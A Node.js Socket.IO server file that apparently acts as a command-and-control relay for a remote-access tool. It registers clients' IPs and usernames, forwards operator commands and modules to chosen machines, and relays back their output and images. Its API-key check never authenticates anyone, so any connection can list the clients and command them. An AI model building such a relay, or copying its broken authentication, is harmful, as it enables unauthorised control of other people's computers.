const express = require('express');
const http = require('http');
const { connect } = require('http2');
const socketIO = require('socket.io');

require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = socketIO(server);

const port = process.env.PORT;

const API_KEY = process.env.API_KEY
let connectedClients = {}
// Serve static files from the "public" folder
app.use(express.static('public'));

// Socket.IO event handling
io.on('connection', (socket) => {

  socket.on('establishment', (data) => {
    console.log(data)
    try {
      if (!data.client) {
        socket.data.isClient = false;
        if (data.apiKey === API_KEY) {
          socket.data.isAuthenticated = false;
        } else {
          socket.data.isAuthenticated = false;
        }
      } else {
        socket.data.isClient = true;
        if (data.customId) {
          socket.id = data.customId;
        }
        const clientInfo = {
          ip: data.ip, // Assuming you have 'ip' in the data object
          username: data.username, // Assuming you have 'username' in the data object
          id: socket.id
        };
        connectedClients[socket.id] = clientInfo;
      }
      socket.emit('establishmentResponse', 200)
    } catch (error) {
      console.log(error)
      socket.emit('establishmentResponse', 500)
    }

    console.log(socket.id, "established");
  });

  socket.on('sendCommand', (data) => {
    let sendingData = {'command': data.command, 'returnAddress': socket.id, 'module': data.module}
    io.to(data.target).emit('command', sendingData);
  });

  socket.on('commandResponse', (data) => {
    let sendingData = {'output': data.output, 'immediate': data.immediate, 'client': socket.id, 'originalCommand': data.originalCommand};
    console.log(sendingData)
    io.to(data.returnAddress).emit('sendCommandResponse', sendingData);
  });

  socket.on('getInfo', (data) => {
    socket.emit('getInfoResponse', connectedClients[data.target]); //bracket notation to prevent confusion
  });
  
  socket.on('imageFromClient', (data) => {
    new_data = {'id': socket.id, 'image': data.image}
    console.log(data.returnAddress)
    io.to(data.returnAddress).emit('imageFromClientForwarding', new_data);
  })

  // Handle 'disconnect' event
  socket.on('disconnect', () => {
    console.log('A user disconnected');
    delete connectedClients[socket.id]
  });

  socket.on('getConnectedClients', (data) => {
    let sendData = {'connectedClients': connectedClients, 'isShell': data.isShell}
    socket.emit('getConnectedClientsResponse', sendData);
  });
});

// Start the server
server.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
